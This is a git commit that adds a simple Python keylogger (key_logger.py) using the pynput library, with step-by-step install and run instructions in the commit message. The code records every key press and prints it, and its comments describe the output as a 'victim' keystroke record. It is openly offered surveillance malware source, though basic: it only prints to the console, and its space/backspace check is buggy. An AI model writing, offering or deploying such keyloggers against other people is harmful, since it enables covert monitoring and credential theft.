08440d3f5dc2992b8dd6de0941834415afde9a0c
Epavinath <125739963+Epavinath@users.noreply.github.com>
2024-02-03 22:23:04 +0530

    SIMPLE_KEY_LOGGING
    Create a simple_key stocks in using python program:
    ----------------------------------------------------------
    USING METHODS:-
    step1: Save python file eg:-key_logger.py
    step2: Open command_ prompt CMD
    step3: COMMAND: - > pip install pynput
    step4: Go to particular python file_path
    step5: COMMAND:-> python (eg:-key_logger.py)
    "YOUR KEY LOGGING IS STARTNG"

---
+++ key_logger.py
@@ -0,0 +1,23 @@
+import pynput.keyboard as pavi
+stored_key=""
+def key_press(key):
+    global stored_key
+    try:
+      stored_key=stored_key + str(key.char)
+      print(stored_key) #display victim key_stocks
+    except AttributeError:
+        if key==key.space or key.backspace:
+          stored_key=stored_key+" "
+          print(" ")
+        else:
+          stored_key = stored_key +" "+ str(key)+ " "
+          print(stored_key)  # display victim key_stocks
+
+
+"""                       callback function
+                                  |
+                                  V         """
+key_record=pavi.Listener(on_press=key_press)
+#using with command
+with key_record as listener:
+    listener.join()
